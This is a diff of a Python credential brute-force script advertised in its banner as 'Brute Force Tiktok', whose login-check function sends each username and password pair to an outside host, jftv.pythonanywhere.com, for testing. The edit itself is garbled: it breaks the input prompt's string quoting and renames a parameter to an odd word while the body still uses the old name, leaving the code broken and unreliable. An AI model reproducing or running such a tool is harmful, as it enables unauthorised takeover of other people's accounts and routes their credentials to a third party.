@@ -18,8 +18,8 @@ FILZA=input("""
 1/k) [ Kali linux / Windows ]
 2/p) [ iphon / android ]
 
-Enter your device type : """)
-def Check_login(user,pess):
+Enter your device type : 2)
+def Check_login(ixorthoegypt,pess):
 	send=r.get(f'https://jftv.pythonanywhere.com/tik/{user}:{pess}',headers={'Host': 'jftv.pythonanywhere.com',
 	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0','Upgrade-Insecure-Requests': '1'})
 	if login in send.text:
@@ -97,7 +97,7 @@ def Linux():
 | |              | || |              | || |              | | |{red} |              | || |              | || |              | |{wit}
 | '--------------' || '--------------' || '--------------' |{red} | '--------------' || '--------------' || '--------------' |{wit}
  '----------------'  '----------------'  '----------------{red}'   '----------------'  '----------------'  '----------------'{wit} 
-    Brute Force {red}Tiktok{wit} [email/user:pass]
+    Brute Force {red}Tiktok{wit} [email/user:ixorthoegypt]
                                    ▄︻̷̿┻̿═━一 BY {red}JOKER{wit} (@VV1CK | @TweakPY) ╾━╤デ╦︻(▀̿Ĺ̯▀̿ ̿)""")
 	File_Mail()
 def phone():
